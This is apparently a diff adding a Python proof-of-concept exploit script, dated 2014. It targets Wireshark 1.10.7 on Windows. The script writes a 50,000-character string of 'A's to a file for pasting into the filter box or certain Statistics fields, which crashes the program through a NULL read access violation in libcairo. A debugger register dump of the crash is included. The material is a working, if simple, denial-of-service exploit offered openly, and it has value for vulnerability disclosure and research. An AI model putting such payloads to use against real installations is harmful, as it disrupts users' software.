@@ -1,0 +1,30 @@
+#!/usr/bin/python
+# Exploit Title: Wireshark Read Access Violation near NULL starting at libcairo_2!cairo_image_surface_get_data()
+# Date: May 15th 2014
+# Author: Osanda Malith Jayathissa
+# E-Mail: osandajayathissa<[at]>gmail.com
+# Version: 1.10.7 32-bit and 64-bit
+# Vendor Homepage: http://www.wireshark.org
+# Tested on: Windows 8 64-bit
+'''
+The issue is with the cairo_image_surface_get_data() function in Cairo.
+These fields are vulnerable:
+- Filter text box
+- Statistics -> IP DESTINATIONS
+- Statistics -> IP Addresses
+Paste the generated text in any one of above fields and hit return.
+'''
+
+payload = "A" * 50000
+file = open('exploit.txt', "w")
+file.write(payload)
+file.close()
+
+'''
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files (x86)\Wireshark32\libcairo-2.dll - 
+eax=00000000 ebx=052dabf0 ecx=77bc2ad2 edx=612fc6e0 esi=00000000 edi=612fc6e0
+eip=61291737 esp=008cdca0 ebp=00000000 iopl=0         nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210206
+libcairo_2!cairo_image_surface_get_data+0x7:
+61291737 8138609d2f61    cmp     dword ptr [eax],offset libcairo_2!cairo_tee_surface_index+0xd080 (612f9d60) ds:002b:00000000=????????
+'''
